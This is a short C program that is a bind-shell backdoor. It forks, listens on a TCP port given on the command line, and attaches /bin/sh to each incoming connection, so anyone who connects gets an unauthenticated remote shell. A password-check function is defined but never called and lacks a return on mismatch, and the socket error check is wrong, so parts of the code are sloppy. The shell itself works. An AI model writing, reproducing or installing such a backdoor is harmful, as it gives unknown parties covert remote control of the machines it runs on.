#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
int main(argc,argv)
int argc;
char **argv;
{  
 int sockfd, newfd;
 struct sockaddr_in remote;
 if(fork() == 0) { 
 remote.sin_family = AF_INET;
 remote.sin_port = htons(atoi(argv[1]));
 remote.sin_addr.s_addr = htonl(INADDR_ANY); 
 sockfd = socket(AF_INET,SOCK_STREAM,0);
 if(!sockfd) perror("socket error");
 bind(sockfd, (struct sockaddr *)&remote, 0x10);
 listen(sockfd, 5);
 while(1)
  {
   newfd=accept(sockfd,0,0);
   dup2(newfd,0);
   dup2(newfd,1);
   dup2(newfd,2);   
   execl("/bin/sh","sh",(char *)0); 
   close(newfd);
  }
 }
}
int chpass(char *base, char *entered) {
int i;
for(i=0;i<strlen(entered);i++) 
{
if(entered[i] == '\n')
entered[i] = '\0'; 
if(entered[i] == '\r')
entered[i] = '\0';
}
if (!strcmp(base,entered))
return 0;
}